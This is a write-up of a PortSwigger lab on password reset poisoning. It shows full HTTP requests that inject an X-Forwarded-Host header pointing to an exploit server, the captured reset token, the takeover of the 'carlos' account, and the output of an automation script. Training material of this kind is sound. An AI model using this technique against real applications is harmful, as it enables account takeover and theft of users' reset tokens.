# Lab: Password reset poisoning via middleware

### Instructions

This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server. 

### Solution

Launching the lab, we can can turn on Burp and intercept the Forgot Password request using the provided username:

```
POST /forgot-password HTTP/2
Host: 0a5c004703764cfe81822c2500ee00d0.web-security-academy.net
Cookie: session=fJeHQ2LaL78g5gNYq2xO0akFp5p9txMD
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0a5c004703764cfe81822c2500ee00d0.web-security-academy.net
Referer: https://0a5c004703764cfe81822c2500ee00d0.web-security-academy.net/forgot-password
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=wiener
```

We can use the `X-Forwarded-Host` header and point it to the provided exploit server URL, and change the username to carlos to request a password reset token:

```
POST /forgot-password HTTP/2
Host: 0a5c004703764cfe81822c2500ee00d0.web-security-academy.net
Cookie: session=fJeHQ2LaL78g5gNYq2xO0akFp5p9txMD
X-Forwarded-Host: exploit-0af3007403144c10812c2bb101a8008e.exploit-server.net/exploit
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0a5c004703764cfe81822c2500ee00d0.web-security-academy.net
Referer: https://0a5c004703764cfe81822c2500ee00d0.web-security-academy.net/forgot-password
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=carlos
```

Checking the logs in our exploit server we find:

```
10.0.3.76       2026-06-16 19:48:48 +0000 "GET /exploit/forgot-password?temp-forgot-password-token=ffrjotm24vxi3dizfkmayvdpxebw1vll HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

We can then navigate to: 

```
https://0a5c004703764cfe81822c2500ee00d0.web-security-academy.net/forgot-password/?temp-forgot-password-token=ffrjotm24vxi3dizfkmayvdpxebw1vll
```

Which gives us the option to reset user carlos' password.

We can update this to `test123` and then login with the credentials `carlos:test123` to complete the lab.

```
My Account

Your username is: carlos

Your email is: carlos@carlos-montoya.net
```

### Python Solution

See `auth_11.py`

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Authentication/Auth_11_password_reset_poisoning_via_middleware]
└─$ python auth_11.py https://0af5008a04861db081f334420036008f.web-security-academy.net/ https://exploit-0a52006d043b1d5c814633200189000a.exploit-server.net/
[+] Target lab: https://0af5008a04861db081f334420036008f.web-security-academy.net
[+] Exploit server: https://exploit-0a52006d043b1d5c814633200189000a.exploit-server.net
[*] Sending password request for user: carlos
[+] Reset request sent (status: 200)
[*] Fetching token from exploit server logs
[+] Token found: tf0u7nimyptibh4uks5u4eq255he6yqx
[*] Resetting password for carlos
[+] Reset response status: 200
[*] Verifying login as carlos:test123
[+] Login successful - carlos:test123
```